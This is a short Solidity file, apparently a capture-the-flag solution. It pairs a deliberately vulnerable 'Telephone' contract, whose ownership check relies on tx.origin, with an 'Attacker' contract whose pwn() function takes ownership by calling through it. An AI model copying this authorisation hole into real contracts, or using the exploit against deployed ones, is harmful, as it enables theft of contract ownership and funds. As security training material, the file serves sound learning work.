// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attacker {
    Telephone immutable victim;

    constructor(address victimAddress) {
        victim = Telephone(victimAddress);
    }

    function pwn() external {
        victim.changeOwner(tx.origin);
    }
}
